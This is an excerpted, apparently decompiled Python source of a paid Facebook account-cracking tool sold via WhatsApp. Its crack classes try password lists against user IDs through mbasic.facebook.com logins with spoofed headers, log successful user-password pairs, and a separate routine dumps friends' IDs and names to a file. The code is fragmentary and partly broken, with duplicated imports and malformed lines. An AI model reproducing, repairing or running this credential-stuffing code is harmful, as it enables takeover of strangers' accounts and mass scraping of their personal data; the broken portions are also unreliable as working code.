...
from concurrent.futures import ThreadPoolExecutor as FOYSAL
from concurrent.futures import ThreadPoolExecutor as FOYSAL
from datetime import datetime
from bs4 import BeautifulSoup
...
def main():
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING FOYSAL-FLOWERS TOOL')  
    else:
...
def sex():
  ...
  try: 
    httpCaht = requests.get("https://github.com/FOYSAL-404/Approval.txt/blob/main/Approval.txt").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+8801793268786?text=*Hello*%2C%20*MR.FOYSAL*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*Random*%20*clone*')
      time.sleep(3) 
      sys.exit() 
  except: 
    sys.exit() 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mfoysal\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMFOYSALG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamFOYSALgBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;31m[\033[1;30mFOYSAL-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mFOYSAL\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[FOYSAL-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[FOYSAL-CP] %s | %s%s      ' % (user,pw,tahun(user)))
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mfoysal\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
class load:
    def __init__(self):
        ...
        print('\n')
banner = """\033[1;97m
 '\033[1;35m'  _______   ______   ____    ____  _______.     ___       __      
'\033[1;35m' |   ____| /  __  \  \   \  /   / /       |    /   \     |  |     
\033[1;95m |  |__   |  |  |  |  \   \/   / |   (----`   /  ^  \    |  |     
\033[1;94m |   __|  |  |  |  |   \_    _/   \   \      /  /_\  \   |  |     
\033[1;95m |  |     |  `--'  |     |  | .----)   |    /  _____  \  |  `----.
\033[1;95m  |__|      \______/      |__| |_______/    /__/     \__\ |_______|
                                                                 
               
                                 (>Welcome FOYSAL-POWER>)                 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;95m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m Mohammad Foysal│\033[1;37m• \033[1;36mTHIS TOOL IS PAID\033[1;37m•\033[1;32m │
\033[1;95m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m FOYSAL HOSEN │\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;95m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 01793268786  │\033[1;32m──────────────────────\033[1;32m│
\033[1;95m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m FOYSAL-404│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m(1week200)\033[1;37m•  \033[1;32m│
\033[1;95m└────────────────────────────────────────────────┘
\033[1;96m│         \033[1;37m•  THIS TOOLS CREATED BY FOYSAL HOSEN \033[1;37m•      \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
